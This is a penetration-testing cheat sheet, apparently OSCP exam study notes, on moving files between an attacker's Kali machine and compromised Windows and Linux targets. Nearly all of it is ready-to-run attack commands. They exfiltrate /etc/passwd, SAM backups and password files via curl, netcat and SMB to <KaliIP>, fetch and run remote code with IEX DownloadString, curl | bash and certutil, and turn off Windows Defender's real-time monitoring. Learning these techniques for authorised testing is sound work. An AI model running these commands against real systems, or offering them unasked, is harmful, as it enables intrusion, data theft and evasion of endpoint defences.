# File Transfer Techniques

tags: #File_Transfer #Post_Exploitation #Windows #Linux #Foundational

resources: [HackTricks File Transfer](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration)

> [!info] Methods to transfer files between attacker and target machines. Essential for uploading tools and exfiltrating data.

## Windows to Kali (Exfiltration)

### Using impacket-smbserver

> [!tip] **Most reliable method** for transferring files from Windows to Kali.

#### Setup SMB Server [Local]

```bash
# Basic SMB server
impacket-smbserver share . -smb2support

# With authentication
impacket-smbserver share . -smb2support -username user -password pass
```

```bash
# Specify interface
impacket-smbserver share . -smb2support -ip <KaliIP>
```

#### Transfer Files [Remote]

```cmd
# Copy file to Kali
copy file.txt \\<KaliIP>\share\

# Copy multiple files
copy *.txt \\<KaliIP>\share\

# Copy directory
xcopy C:\Users\Admin\Documents \\<KaliIP>\share\ /E /I
```

```powershell
# PowerShell copy
Copy-Item file.txt -Destination \\<KaliIP>\share\
```

### Using Netcat

#### Receive File [Local]

```bash
nc -lvnp 4444 > received_file.txt
```

#### Send File [Remote]

```cmd
nc <KaliIP> 4444 < file.txt
```

```powershell
# PowerShell
Get-Content file.txt | nc <KaliIP> 4444
```

### Using HTTP POST

#### Setup Receiver [Local]

```python
# Simple HTTP server to receive files
python3 -m uploadserver 80
```

```bash
# Or use this one-liner
sudo python3 -c "import http.server; import socketserver; class MyHandler(http.server.SimpleHTTPRequestHandler): def do_POST(self): length = int(self.headers['Content-Length']); data = self.rfile.read(length); open('uploaded_file', 'wb').write(data); self.send_response(200); self.end_headers(); socketserver.TCPServer(('', 80), MyHandler).serve_forever()"
```

#### Upload File [Remote]

```powershell
# PowerShell
$file = Get-Content file.txt -Raw
Invoke-RestMethod -Uri http://<KaliIP>/upload -Method Post -Body $file
```

### Using FTP

#### Setup FTP Server [Local]

```bash
# Install pyftpdlib
sudo pip3 install pyftpdlib

# Start FTP server
sudo python3 -m pyftpdlib -p 21 -w
```

#### Download from FTP [Remote]

```cmd
# Windows FTP client
ftp <KaliIP>
# Username: anonymous
# Password: (blank)
get file.txt
bye
```

## Kali to Windows (Upload)

### Using impacket-smbserver

#### Setup SMB Server [Local]

```bash
impacket-smbserver share /opt/tools -smb2support
```

#### Download Files [Remote]

```cmd
# Copy from Kali to Windows
copy \\<KaliIP>\share\nc.exe C:\Windows\Temp\

# Execute directly from share
\\<KaliIP>\share\nc.exe -h
```

### Using HTTP Server

#### Setup HTTP Server [Local]

```bash
# Python HTTP server
python3 -m http.server 80

# Specify directory
python3 -m http.server 80 --directory /opt/tools
```

```bash
# PHP HTTP server
php -S 0.0.0.0:80
```

#### Download Files [Remote]

```powershell
# PowerShell - Invoke-WebRequest
iwr -uri http://<KaliIP>/nc.exe -Outfile nc.exe

# PowerShell - WebClient
(New-Object Net.WebClient).DownloadFile('http://<KaliIP>/nc.exe','nc.exe')
```

```cmd
# certutil
certutil -urlcache -split -f "http://<KaliIP>/nc.exe" nc.exe

# bitsadmin
bitsadmin /transfer myDownload /download /priority high http://<KaliIP>/nc.exe C:\Windows\Temp\nc.exe
```

### Using PowerShell

```powershell
# Download and execute in memory
IEX(New-Object Net.WebClient).DownloadString('http://<KaliIP>/script.ps1')

# Download file
Invoke-WebRequest -Uri http://<KaliIP>/file.exe -Outfile file.exe

# Alternative
wget http://<KaliIP>/file.exe -O file.exe
```

### Using curl (if available)

```cmd
curl http://<KaliIP>/file.exe -o file.exe
curl http://<KaliIP>/file.exe --output file.exe
```

## Linux File Transfers

### Download from Kali [Remote]

```bash
# wget
wget http://<KaliIP>/file.sh

# curl
curl http://<KaliIP>/file.sh -o file.sh
curl http://<KaliIP>/file.sh > file.sh

# Download and execute
curl http://<KaliIP>/script.sh | bash
wget -O - http://<KaliIP>/script.sh | bash
```

### Upload to Kali [Remote]

```bash
# Using curl
curl -X POST -F "file=@/etc/passwd" http://<KaliIP>/upload

# Using nc
nc <KaliIP> 4444 < /etc/passwd
```

### Using SCP

```bash
# Upload to Kali
scp file.txt user@<KaliIP>:/tmp/

# Download from Kali
scp user@<KaliIP>:/opt/tools/file.sh /tmp/
```

## Base64 Encoding (Small Files)

### Encode on Kali [Local]

```bash
base64 -w 0 nc.exe > nc.b64
cat nc.b64
```

### Decode on Windows [Remote]

```powershell
# Copy base64 string and decode
$b64 = "TVqQAAMAAAAEAAAA//8AALgAAAAA..."
[System.IO.File]::WriteAllBytes("nc.exe", [System.Convert]::FromBase64String($b64))
```

### Decode on Linux [Remote]

```bash
echo "TVqQAAMAAAAEAAAA//8AALgAAAAA..." | base64 -d > nc
chmod +x nc
```

## Complete Workflow Examples

### Example 1: Upload Tool to Windows

```bash
# On Kali - Start SMB server
impacket-smbserver share /opt/tools -smb2support
```

```cmd
# On Windows - Copy tool
copy \\<KaliIP>\share\winPEAS.exe C:\Windows\Temp\
```

### Example 2: Exfiltrate Data from Windows

```bash
# On Kali - Start SMB server
impacket-smbserver loot . -smb2support
```

```cmd
# On Windows - Copy sensitive files
copy C:\Users\Admin\Desktop\passwords.txt \\<KaliIP>\loot\
copy C:\Users\Admin\Documents\*.docx \\<KaliIP>\loot\
```

### Example 3: Download and Execute Script

```bash
# On Kali - Start HTTP server
python3 -m http.server 80
```

```powershell
# On Windows - Download and execute
IEX(New-Object Net.WebClient).DownloadString('http://<KaliIP>/PowerUp.ps1')
Invoke-AllChecks
```

### Example 4: Transfer via Netcat

```bash
# On Kali - Listen for file
nc -lvnp 4444 > sam.bak
```

```cmd
# On Windows - Send file
nc <KaliIP> 4444 < C:\Windows\Temp\sam.bak
```

## Advanced Techniques

### Using Evil-WinRM

```bash
# Connect with Evil-WinRM
evil-winrm -i <TargetIP> -u <User> -p <Pass>
```

```powershell
# Upload file
upload /opt/tools/nc.exe C:\Windows\Temp\nc.exe

# Download file
download C:\Users\Admin\Desktop\flag.txt
```

### Using RDP Shared Folder

```bash
# Mount local folder in RDP session
xfreerdp3 /u:<User> /p:<Pass> /v:<TargetIP> /drive:share,/opt/tools
```

```cmd
# On Windows - Access shared folder
dir \\tsclient\share
copy \\tsclient\share\nc.exe C:\Windows\Temp\
```

### Using Meterpreter

```bash
# In Meterpreter session
upload /opt/tools/nc.exe C:\\Windows\\Temp\\nc.exe
download C:\\Users\\Admin\\Desktop\\passwords.txt
```

## Troubleshooting

### SMB Server Not Working

```bash
# Try without SMB2 support
impacket-smbserver share . 

# Try with authentication
impacket-smbserver share . -smb2support -username user -password pass
```

```cmd
# On Windows - Connect with credentials
net use \\<KaliIP>\share /user:user pass
copy file.txt \\<KaliIP>\share\
```

### PowerShell Download Blocked

```powershell
# Bypass execution policy
powershell -ep bypass

# Use different method
certutil -urlcache -split -f "http://<KaliIP>/file.exe" file.exe
```

### Firewall Blocking

```bash
# Try different ports
python3 -m http.server 8080
python3 -m http.server 443
```

### AV Blocking Downloads

```powershell
# Disable Windows Defender (if admin)
Set-MpPreference -DisableRealtimeMonitoring $true

# Use obfuscation
# Encode payload with base64
```

## Quick Reference

### Windows Download Methods

```cmd
# certutil (most reliable)
certutil -urlcache -split -f "http://<IP>/file.exe" file.exe

# PowerShell
powershell -c "iwr -uri http://<IP>/file.exe -Outfile file.exe"

# bitsadmin
bitsadmin /transfer job /download /priority high http://<IP>/file.exe C:\Temp\file.exe
```

### Windows Upload Methods

```cmd
# SMB (best)
copy file.txt \\<KaliIP>\share\

# Netcat
nc <KaliIP> 4444 < file.txt

# PowerShell
Invoke-RestMethod -Uri http://<KaliIP>/upload -Method Post -InFile file.txt
```

### Linux Download Methods

```bash
# wget (most common)
wget http://<IP>/file.sh

# curl
curl http://<IP>/file.sh -o file.sh

# Download and execute
curl http://<IP>/script.sh | bash
```

### Linux Upload Methods

```bash
# Netcat
nc <KaliIP> 4444 < file.txt

# curl
curl -X POST -F "file=@file.txt" http://<KaliIP>/upload

# SCP
scp file.txt user@<KaliIP>:/tmp/
```

## OSCP Exam Tips

> [!warning] In OSCP exam:
> - impacket-smbserver is your best friend
> - Always have HTTP server ready
> - Test file transfers before exam
> - Know multiple methods in case one fails

> [!tip] Quick exam setup:
> 1. Terminal 1: `impacket-smbserver share . -smb2support`
> 2. Terminal 2: `python3 -m http.server 80`
> 3. Terminal 3: `nc -lvnp 4444` (for receiving files)
> 4. Keep these running throughout exam

## Common File Transfer Checklist

```plaintext
Upload Tools to Target:
☐ Start impacket-smbserver or HTTP server
☐ Use certutil, PowerShell, or wget on target
☐ Verify file transferred correctly
☐ Make executable if needed (chmod +x)

Exfiltrate Data from Target:
☐ Start impacket-smbserver or nc listener
☐ Copy files from target
☐ Verify files received
☐ Document what was exfiltrated
```
